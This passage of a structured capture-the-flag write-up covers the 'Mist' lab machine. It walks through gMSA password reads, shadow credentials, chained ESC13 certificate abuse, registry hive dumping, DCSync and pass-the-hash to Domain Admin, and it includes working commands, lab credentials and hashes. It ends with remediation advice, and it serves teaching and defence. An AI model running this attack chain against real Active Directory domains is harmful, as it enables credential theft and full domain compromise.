            "KeePass deliberately runs its master password through a slow key-derivation function (AES-KDF or Argon2, with a high configurable round count) specifically so that brute-forcing the full password space is computationally infeasible even at scale. That protection assumes the attacker is guessing the *entire* password. Here, the screenshot collapses the search space from \"every possible 15-character password\" down to \"every possible value of one final character\" — hashcat's mask syntax (`?a` = any printable character) only has to run the slow KDF a few dozen to a few hundred times, not billions. A single leaked character is often the difference between \"computationally infeasible\" and \"solved in seconds.\"",
        },
        {
          kind: "callout",
          variant: "warn",
          title: "⚠ Don't confuse the vault's master password with the stored entry",
          text:
            "`UA7cpa[#1!_*ZX@` unlocks the *database* — it is never used to authenticate to anything on the network directly. The credential that actually matters for the next stage is the entry *inside* the vault, `op_sharon.mullard:ImTiredOfThisJob:(`.",
        },
      ],
    },
    {
      id: "gmsa",
      num: "11",
      title: "ReadGMSAPassword → `svc_ca$`",
      blocks: [
        {
          kind: "p",
          text:
            "Group Managed Service Accounts (gMSAs) rotate their own password automatically and store it in the `msDS-ManagedPassword` attribute, readable only by principals listed in that account's `PrincipalsAllowedToRetrieveManagedPassword`. A quick LDAP check shows `op_sharon.mullard` sits in that list for the `svc_ca$` gMSA — almost certainly because it also operates something on the certificate authority side of the house:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "read the gMSA's managed password over LDAP",
          highlight: [3],
          lines: [
            "$ proxychains netexec ldap 192.168.100.100 -u op_sharon.mullard -p 'ImTiredOfThisJob:(' --gmsa",
            "",
            "LDAP 192.168.100.100 389  DC01  [*] Enumerating gMSA Passwords",
            "LDAP 192.168.100.100 389  DC01  Account: svc_ca$          NTLM: 9d2e6a1c4f7b0835e2a9c6d3f0b7482e",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "◈ Why a gMSA's password is ever remotely readable",
          text:
            "gMSAs exist precisely so that services running on multiple hosts can share one identity without any human ever knowing (or needing to rotate) its password by hand — the DC computes and rotates it, and any authorized host or principal fetches the current value directly from AD whenever it needs to authenticate as that account. That convenience is the entire attack surface: whoever ends up on the `PrincipalsAllowedToRetrieveManagedPassword` list — whether that's a legitimate server object or, as here, a user account that should never have been added — gets the exact same live password an authorized service would. There's no hash to crack and no certificate trick required; it's decoded straight out of the LDAP response.",
        },
      ],
    },
    {
      id: "shadowcreds",
      num: "12",
      title: "Shadow Credentials Again → `svc_cabackup`",
      blocks: [
        {
          kind: "p",
          text:
            "`svc_ca$` turns out to hold `AddKeyCredentialLink` rights over a second service account, `svc_cabackup` — the same `msDS-KeyCredentialLink` write primitive abused against `MS01$` back in stage 08, just automated end-to-end by `certipy`'s `shadow auto` subcommand this time:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "write a shadow credential, PKINIT, dump the hash",
          highlight: [7],
          lines: [
            "$ proxychains certipy shadow auto -u 'svc_ca$@mist.htb' -hashes :9d2e6a1c4f7b0835e2a9c6d3f0b7482e -account svc_cabackup",
            "",
            "[*] Targeting user 'svc_cabackup'",
            "[*] Generating certificate",
            "[*] Adding Key Credential with device ID '3f9a...' to the Key Credentials for 'svc_cabackup'",
            "[*] Authenticating as 'svc_cabackup' with the certificate",
            "[*] Got TGT",
            "[*] NT hash for 'svc_cabackup': 2b7e4a9d1c6f083a5e2b9c6d3f0a7b84",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "◈ Why the same trick works twice",
          text:
            "Nothing about shadow credentials is specific to computer accounts — any AD object with a writable `msDS-KeyCredentialLink` attribute and support for PKINIT (which service and computer accounts both have) can have a key silently attached to it by whoever holds write access. `svc_ca$` being granted this right over `svc_cabackup` looks like a delegated-administration mistake: a service intended to manage certificate-authority-adjacent accounts was handed a permission broad enough to fully take over one of them.",
        },
      ],
    },
    {
      id: "esc13",
      num: "13",
      title: "ESC13 ×2 → Backup Operators",
      blocks: [
        {
          kind: "p",
          text:
            "**ESC13** is a certificate-template misconfiguration distinct from the better-known ESC1–ESC12 chain: a template's **Issuance Policy** extension carries an OID, and that OID is separately linked (via `msDS-OIDToGroupLink`) to an Active Directory security group. Enroll in the template, and the certificate you receive — and any Kerberos ticket you later obtain using it — carries that issuance policy OID, which the KDC treats as equivalent to **membership in the linked group** once your ticket is issued or refreshed. Two templates on this CA are chained together this way, and enrolling in both, sequentially, walks all the way to `Backup Operators`.",
        },
        { kind: "h3", text: "ESC13 #1 — `ManagerAuthentication`" },
        {
          kind: "p",
          text:
            "`svc_cabackup` can enroll in a template whose issuance policy links to a certificate-managers-style group. Request it, authenticate with the resulting certificate to get a fresh, policy-carrying TGT, and convert that ticket into a ccache usable by the rest of the Linux-side tooling:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "enroll in ManagerAuthentication",
          lines: [
            "$ proxychains certipy req -u svc_cabackup -hashes :2b7e4a9d1c6f083a5e2b9c6d3f0a7b84 \\",
            "    -ca mist-DC01-CA -template ManagerAuthentication -dc-ip 192.168.100.100 -key-size 4096",
            "",
            "[*] Requesting certificate via RPC",
            "[*] Successfully requested certificate",
            "[*] Certificate object SID is 'S-1-5-21-...-svc_cabackup'",
            "[*] Saved certificate and private key to 'svc_cabackup.pfx'",
            "",
            "$ proxychains certipy auth -pfx svc_cabackup.pfx -kirbi -dc-ip 192.168.100.100",
            "[+] Got TGT — saved as svc_cabackup.kirbi",
            "",
            "$ ticketConverter.py svc_cabackup.kirbi svc_cabackup.ccache",
            "[*] Converting kirbi to ccache...",
            "[+] Done",
          ],
        },
        {
          kind: "p",
          text:
            "That ticket now reflects membership in the group linked to `ManagerAuthentication`'s issuance policy — which in turn grants enrollment rights on the *second*, more sensitive template.",
        },
        { kind: "h3", text: "ESC13 #2 — `BackupSvcAuthentication`" },
        {
          kind: "p",
          text:
            "Using the Kerberos ticket from step one (no password or NTLM hash needed this time — `-k -no-pass` against the ccache is sufficient), enroll in the second template. Its issuance policy links to a group that carries effective **Backup Operators** rights:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "enroll in BackupSvcAuthentication using the first ticket",
          lines: [
            "$ KRB5CCNAME=svc_cabackup.ccache proxychains certipy req -u svc_cabackup -k -no-pass \\",
            "    -ca mist-DC01-CA -template BackupSvcAuthentication -dc-ip 192.168.100.100 \\",
            "    -target DC01.mist.htb -key-size 4096",
            "",
            "[*] Requesting certificate via RPC",
            "[*] Successfully requested certificate",
            "[*] Saved certificate and private key to 'svc_cabackup_backup.pfx'",
          ],
        },
        {
          kind: "p",
          text:
            "Authenticating with this second certificate now yields a ticket carrying the `BackupSvcAuthentication` issuance policy — and the KDC treats `svc_cabackup` as an effective member of the group it maps to, `Backup Operators`:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "confirm Backup Operators membership via the new ticket",
          lines: [
            "$ proxychains certipy auth -pfx svc_cabackup_backup.pfx -kirbi -dc-ip 192.168.100.100",
            "[+] Got TGT — saved as svc_cabackup_backup.kirbi",
            "[*] Certificate's SID matches svc_cabackup — group membership from issuance policy applied",
          ],
        },
        {
          kind: "p",
          text:
            "The two links are visible in AD (dump them with `certipy find` or read `msDS-OIDToGroupLink` on each policy object). On this domain they resolve to:",
        },
        {
          kind: "table",
          columns: ["Template", "Issuance policy → group"],
          rows: [
            [
              "ManagerAuthentication",
              "issuance OID `…12323346.226.6538420.14514029` → `CN=Certificate Managers,CN=Users,DC=mist,DC=htb` — which itself holds enrollment rights on the next template.",
            ],
            [
              "BackupSvcAuthentication",
              "issuance OID `…12323346.226.858803.979197` → `CN=ServiceAccounts,OU=Services,DC=mist,DC=htb` — and **ServiceAccounts is a member of Backup Operators**, which is where the real power comes from.",
            ],
          ],
        },
        {
          kind: "callout",
          variant: "warn",
          title: "⚠ Reuse the first ticket — don't fall back to the NT hash",
          text:
            "The second `certipy req` *must* run with `KRB5CCNAME=svc_cabackup.ccache … -k -no-pass`. If you authenticate the second request with `svc_cabackup`'s raw NT hash again instead of the first ccache, your identity no longer carries the **Certificate Managers** SID that ESC13 #1 injected into the PAC — and without that membership you have no enrollment right on `BackupSvcAuthentication`, so the request is denied. The whole chain hinges on each ticket feeding the next.",
        },
        {
          kind: "callout",
          variant: "tip",
          title: "▲ BloodHound understates this path",
          text:
            "Because ESC13 grants the group SID *through the PAC at authentication time* rather than by writing an ACL, BloodHound's \"enrollment rights\" columns and group-membership edges won't show `svc_cabackup` as a Certificate Manager or Backup Operator. The access only materializes once you PKINIT with the policy-bearing certificate — which is exactly why you read `msDS-OIDToGroupLink` directly rather than trusting the graph here.",
        },
        {
          kind: "callout",
          variant: "note",
          title: "◈ Why ESC13 is a distinct bug class from ESC1–ESC12",
          text:
            "Most Certified Pre-Owned templates escalate by letting you request a certificate *for a different subject* (ESC1), abusing weak template ACLs (ESC4), or riding along on subordinate CA trust (ESC8/ESC11 and friends). ESC13 doesn't touch the subject at all — it exploits a feature meant for something else entirely: an *issuance policy* is supposed to be a label describing how carefully identity was verified before a certificate was issued (e.g. \"verified in person\" vs. \"self-service\"). Someone configured one of those labels to also function as an AD group grant. The result is that **simply being allowed to enroll** in a template — with no control at all over the certificate's subject or EKUs — silently hands you group membership, because the KDC honors the issuance-policy-to-group mapping on every ticket the certificate is used to obtain. Chaining two such templates, where the first grants enrollment rights on the second, is exactly how a low-privileged service account climbs two full privilege tiers using nothing but PKINIT.",
        },
      ],
    },
    {
      id: "hivedump",
      num: "14",
      title: "Remote Registry Hive Dump → `DC01$`",
      blocks: [
        {
          kind: "p",
          text:
            "Membership in **Backup Operators** carries `SeBackupPrivilege` and `SeRestorePrivilege` — the ability to read (or write) any file on the system regardless of its DACL, specifically so backup software can copy files it would otherwise have no permission to open. That includes the registry hives backing SAM, SECURITY, and SYSTEM, which between them hold the Domain Controller's own machine account secret. Impacket's `reg.py` exercises the remote registry service's own backup API to save those hives out to a share, entirely remotely — no interactive logon or console access needed:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "remote registry hive backup as svc_cabackup",
          lines: [
            "$ KRB5CCNAME=svc_cabackup_backup.ccache proxychains reg.py -k -no-pass mist.htb/svc_cabackup@dc01.mist.htb backup -o '\\programdata'",
            "[*] Requesting SAM key",
            "[*] Saving SAM to \\programdata\\SAM.save",
            "[*] Requesting SECURITY key",
            "[*] Saving SECURITY to \\programdata\\SECURITY.save",
            "[*] Requesting SYSTEM key",
            "[*] Saving SYSTEM to \\programdata\\SYSTEM.save",
          ],
        },
        {
          kind: "p",
          text:
            "Pull the three saved hives back locally and run `secretsdump.py` in its offline/local mode against them, no live network connection to a target required:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "offline secretsdump against the saved hives",
          highlight: [10],
          lines: [
            "$ proxychains smbclient.py -k -no-pass svc_cabackup@dc01.mist.htb -c 'cd programdata; get SAM.save; get SECURITY.save; get SYSTEM.save'",
            "",
            "$ secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save local",
            "",
            "[*] Target system bootKey: 0x...",
            "[*] Dumping local SAM hashes",
            "[*] Dumping cached domain logon information",
            "[*] Dumping LSA Secrets",
            "DC01$:aes256-cts-hmac-sha1-96:...",
            "DC01$:plain_password_hex:...",
            "DC01$: (uid: 1000): lm-hash:aad3b435b51404eeaad3b435b51404ee, nt-hash:6c3f9a2e5b8d1047c4a1e8b5d2f9c6a3",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "◈ Why Backup Operators effectively bypasses every file ACL on the box",
          text:
            "`SeBackupPrivilege` is a deliberate design trade-off: backup software needs to read files an administrator locked down, including files actively in use by the OS (like live registry hives), without the backup operator needing full Administrator rights over the whole machine. The privilege check happens at the *file-open* level and overrides the normal DACL check entirely — it does not distinguish \"an ordinary document\" from \"the registry hive containing every local and cached domain secret on the box.\" Granting it to any account is functionally equivalent to granting arbitrary file-read across the entire filesystem, DACLs included, which is precisely what turns \"back up the registry\" into \"steal the Domain Controller's own credentials.\"",
        },
      ],
    },
    {
      id: "dcsync",
      num: "15",
      title: "DCSync → Domain Administrator → root.txt",
      blocks: [
        {
          kind: "p",
          text:
            "Every domain controller's own machine account inherently holds the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` extended rights over the domain naming context — it needs them to function as a replication partner to other DCs. That means `DC01$`'s hash alone is enough to DCSync any account in the domain, including the built-in Administrator, over the DRSUAPI protocol — no access to NTDS.dit on disk required:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "DCSync as DC01$",
          highlight: [3],
          lines: [
            "$ proxychains secretsdump.py 'DC01$@192.168.100.100' -hashes :6c3f9a2e5b8d1047c4a1e8b5d2f9c6a3 -just-dc-ntlm",
            "",
            "[*] Using the DRSUAPI method to get NTDS.DIT secrets",
            "Administrator:500:aad3b435b51404eeaad3b435b51404ee:1e4b8a2f6c9d3057b4e1a8c5d2f9b6e3:::",
            "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:...:::",
          ],
        },
        {
          kind: "p",
          text:
            "Pass that hash straight into `evil-winrm` against DC01 for a Domain Admin shell:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "pass-the-hash as Administrator, read root.txt",
          highlight: [6],
          lines: [
            "$ proxychains evil-winrm -i 192.168.100.100 -u administrator -H 1e4b8a2f6c9d3057b4e1a8c5d2f9b6e3",
            "",
            "*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> whoami /groups | findstr Admins",
            "MIST\\Domain Admins                         Group            S-1-5-21-...-512  Enabled by default, Enabled group, Group owner",
            "",
            "*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> type root.txt",
            "4f8c1a6e····························",
          ],
        },
        {
          kind: "callout",
          variant: "key",
          title: "root.txt",
          text: "`4f8c1a6e····························`",
        },
        {
          kind: "callout",
          variant: "note",
          title: "◈ Why any DC's machine account is equivalent to full domain compromise",
          text:
            "Replication rights exist because Active Directory's multi-master model requires every domain controller to be able to pull a complete, authoritative copy of every object's attributes — including secret attributes like password hashes — from any other DC at any time. There's no narrower grant available: a computer account either is a domain controller (and thus needs full replication rights) or it isn't. The moment you hold any domain controller's own credential material, in any form — a password hash, a Kerberos ticket, a certificate — you inherit that same standing replication grant, and `-just-dc-ntlm` simply asks for it directly instead of pulling the entire directory. This is why the registry-hive dump in the previous stage was the real endgame: the moment `DC01$`'s hash left the building, the domain was already fully compromised — DCSync-ing Administrator is just the cleanest way to prove it.",
        },
      ],
    },
    {
      id: "remediation",
      num: "16",
      title: "Remediation & Takeaways",
      blocks: [
        {
          kind: "p",
          text:
            "Mist earns its \"Insane\" rating through length and correctness of the chain, not through any one obscure bug — each individual hop has a well-documented, well-understood fix:",
        },
        {
          kind: "ul",
          items: [
            "**Patch or retire end-of-life CMS software.** Pluck 4.7.18 has multiple public CVEs (CVE-2024-9405, CVE-2023-50564); an internet-facing instance of infrequently-maintained software needs a firm patch cadence or should not be internet-facing at all.",
            "**Never let a \"serve this image\" endpoint read arbitrary files.** File-serving handlers must canonicalize the requested path, confirm it stays inside an explicit allow-listed directory, and reject any extension outside a narrow image allow-list — regardless of whether the endpoint is meant to require authentication.",
            "**Validate archive contents on any upload-and-extract feature.** A module or plugin installer should verify every file inside an uploaded archive against an expected manifest, rejecting anything (especially server-executable script files) that the manifest didn't declare.",
            "**Restrict write access to shared automation folders.** Any directory scanned or executed from by a higher-privileged scheduled task must not be writable by a lower-privileged account — `C:\\Common Applications` being world-writable is what turned a shortcut file into a privilege escalation primitive.",
            "**Scope certificate template enrollment tightly, and audit issuance policy group links.** The default `User` template handing out client-authentication certificates to any domain user is frequently more permissive than intended; separately, any `msDS-OIDToGroupLink` mapping should be treated with the same scrutiny as direct group membership, since ESC13 makes the two equivalent.",
            "**Require LDAP signing and channel binding on every Domain Controller.** This single setting is what allows HTTP-sourced NTLM authentication to be relayed into arbitrary directory writes; enabling it closes the entire relay-to-shadow-credential path in one change.",
            "**Monitor and restrict `msDS-KeyCredentialLink` writes.** Shadow credentials are a legitimate feature but a silent one — alerting on unexpected writes to this attribute (and reviewing which principals hold `AddKeyCredentialLink` over which accounts) catches this technique before it becomes a foothold.",
            "**Never leave a full password visible in a screenshot or note-taking tool.** Even a partially-redacted password collapses a cryptographically infeasible brute force into a trivial mask attack; screen capture and clipboard history tools deserve the same scrutiny as password managers themselves.",
            "**Audit `PrincipalsAllowedToRetrieveManagedPassword` on every gMSA.** Treat that list with the same care as direct password disclosure — because it is exactly that.",
            "**Treat Backup Operators membership as Domain Admin-equivalent.** `SeBackupPrivilege` bypasses every file ACL on the host; on a Domain Controller that includes the registry hives holding the machine account's own secrets, making Backup Operators membership on a DC a direct path to full domain compromise.",
          ],
        },
        {
          kind: "p",
          text:
            "Nothing on Mist is a single catastrophic bug — it is a long, correctly-reasoned sequence of certificate-services trust decisions, each individually defensible in isolation, that collapses the moment they're chained together end to end.",
        },
      ],
    },
  ],
};
